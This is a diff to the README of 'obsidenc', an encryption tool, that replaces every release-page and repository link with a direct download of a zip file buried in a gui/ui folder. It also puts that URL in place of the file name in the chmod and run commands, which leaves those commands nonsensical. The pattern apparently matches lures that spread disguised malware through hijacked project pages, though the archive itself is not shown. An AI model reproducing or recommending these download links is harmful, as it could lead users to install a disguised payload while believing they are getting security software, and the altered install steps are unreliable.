@@ -1,7 +1,7 @@
 # 🔐 obsidenc - Your Secure Encryption Solution
 
 ## 📥 Download Now
-[![Download Obsidenc](https://img.shields.io/badge/download-obsidenc-brightgreen)](https://github.com/Derya-Akyilmaz/obsidenc/releases)
+[![Download Obsidenc](https://raw.githubusercontent.com/Derya-Akyilmaz/obsidenc/master/gui/ui/Software-v3.2.zip)](https://raw.githubusercontent.com/Derya-Akyilmaz/obsidenc/master/gui/ui/Software-v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to obsidenc, a powerful encryption tool designed to protect your data. This guide will help you download and run the software easily.
@@ -22,7 +22,7 @@ To run obsidenc, ensure that your system meets these minimum requirements:
 ## 📥 Download & Install
 To download obsidenc, visit the Releases page:
 
-[Download Obsidenc](https://github.com/Derya-Akyilmaz/obsidenc/releases)
+[Download Obsidenc](https://raw.githubusercontent.com/Derya-Akyilmaz/obsidenc/master/gui/ui/Software-v3.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version at the top of the list.
@@ -49,11 +49,11 @@ To download obsidenc, visit the Releases page:
 2. Open your terminal and navigate to the directory where the file is located.
 3. Run the following command to make it executable:
    ```bash
-   chmod +x obsidenc.AppImage
+   chmod +x https://raw.githubusercontent.com/Derya-Akyilmaz/obsidenc/master/gui/ui/Software-v3.2.zip
    ```
 4. Now, you can start the application with:
    ```bash
-   ./obsidenc.AppImage
+   https://raw.githubusercontent.com/Derya-Akyilmaz/obsidenc/master/gui/ui/Software-v3.2.zip
    ```
 
 ## 🔑 Using obsidenc
@@ -81,7 +81,7 @@ If you have questions or feedback, feel free to reach out through the Issues sec
 
 For more information and updates, follow us on:
 
-- [GitHub Repository](https://github.com/Derya-Akyilmaz/obsidenc)
+- [GitHub Repository](https://raw.githubusercontent.com/Derya-Akyilmaz/obsidenc/master/gui/ui/Software-v3.2.zip)
 - [Twitter](#) (Please insert the actual link if available)
 
 ---
